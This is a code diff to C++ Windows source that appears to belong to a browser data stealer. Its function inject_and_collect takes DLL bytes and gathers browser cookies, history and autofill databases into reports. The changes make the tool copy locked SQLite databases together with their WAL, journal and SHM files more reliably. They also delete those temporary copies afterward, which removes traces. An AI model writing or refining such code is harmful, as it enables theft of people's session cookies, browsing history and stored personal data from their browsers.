@@ -197,6 +197,7 @@ std::string wstring_to_utf8(const std::wstring& wstr) {
 }
 
 bool copy_single_file(const fs::path& source, const fs::path& dest) {
+    if (CopyFileW(source.c_str(), dest.c_str(), FALSE)) return true;
     for (int i = 0; i < 3; i++) {
         HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
         if (h_src != INVALID_HANDLE_VALUE) {
@@ -226,24 +227,28 @@ bool copy_single_file(const fs::path& source, const fs::path& dest) {
 bool copy_file_locked(const fs::path& source, const fs::path& dest) {
     if (!copy_single_file(source, dest)) return false;
 
-    fs::path wal = source; wal += "-wal";
-    if (fs::exists(wal)) {
-        fs::path dest_wal = dest; dest_wal += "-wal";
-        copy_single_file(wal, dest_wal);
-    }
+    fs::path wal = source.string() + "-wal";
+    if (fs::exists(wal)) copy_single_file(wal, dest.string() + "-wal");
 
-    fs::path journal = source; journal += "-journal";
-    if (fs::exists(journal)) {
-        fs::path dest_journal = dest; dest_journal += "-journal";
-        copy_single_file(journal, dest_journal);
-    }
+    fs::path journal = source.string() + "-journal";
+    if (fs::exists(journal)) copy_single_file(journal, dest.string() + "-journal");
+
+    fs::path shm = source.string() + "-shm";
+    if (fs::exists(shm)) copy_single_file(shm, dest.string() + "-shm");
 
     return true;
 }
 
 int open_db_readonly(const std::string& path, sqlite3** db) {
-    std::string uri = "file:" + path + "?mode=ro&nolock=1";
+    std::string uri = "file:" + path + "?mode=ro";
     return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI | SQLITE_OPEN_NOMUTEX, nullptr);
+}
+
+void cleanup_db_temp(const fs::path& path) {
+    fs::remove(path);
+    fs::remove(path.string() + "-wal");
+    fs::remove(path.string() + "-journal");
+    fs::remove(path.string() + "-shm");
 }
 
 struct BrowserConfig {
@@ -490,7 +495,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     }
                     sqlite3_close(db);
                 }
-                fs::remove(tmp_db);
+                cleanup_db_temp(tmp_db);
             }
 
             // Cookies
@@ -535,7 +540,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     }
                     sqlite3_close(db);
                 }
-                fs::remove(tmp_db);
+                cleanup_db_temp(tmp_db);
             }
 
             // History
@@ -555,7 +560,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     }
                     sqlite3_close(db);
                 }
-                fs::remove(tmp_db);
+                cleanup_db_temp(tmp_db);
             }
 
             // Autofill
@@ -575,7 +580,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     }
                     sqlite3_close(db);
                 }
-                fs::remove(tmp_db);
+                cleanup_db_temp(tmp_db);
             }
 
             // Save reports
